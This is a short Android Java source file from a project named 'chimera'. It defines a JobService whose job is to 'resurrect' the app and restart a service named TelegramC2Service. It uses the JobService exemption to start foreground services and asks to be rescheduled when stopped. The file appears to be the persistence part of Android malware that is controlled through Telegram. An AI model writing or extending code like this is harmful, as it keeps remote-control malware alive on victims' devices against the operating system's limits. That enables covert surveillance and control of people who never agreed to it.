package com.chimera;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;

public class ResurrectionJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
        // Offload to thread - WorkManager pattern
        new Thread(() -> {
            try {
                ResurrectionHelper.resurrect(getApplicationContext());
                // Try FGS start - JobService has exemption to start FGS while running
                Intent i = new Intent(getApplicationContext(), TelegramC2Service.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    try { getApplicationContext().startForegroundService(i); } catch (Exception e) { ErrorLogger.logError(getApplicationContext(), "JobService_FGS", e); }
                } else {
                    getApplicationContext().startService(i);
                }
            } catch (Exception e) { ErrorLogger.logError(getApplicationContext(), "ResurrectionJobService", e); }
            finally { jobFinished(params, false); }
        }).start();
        return true; // async
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true; // reschedule
    }
}
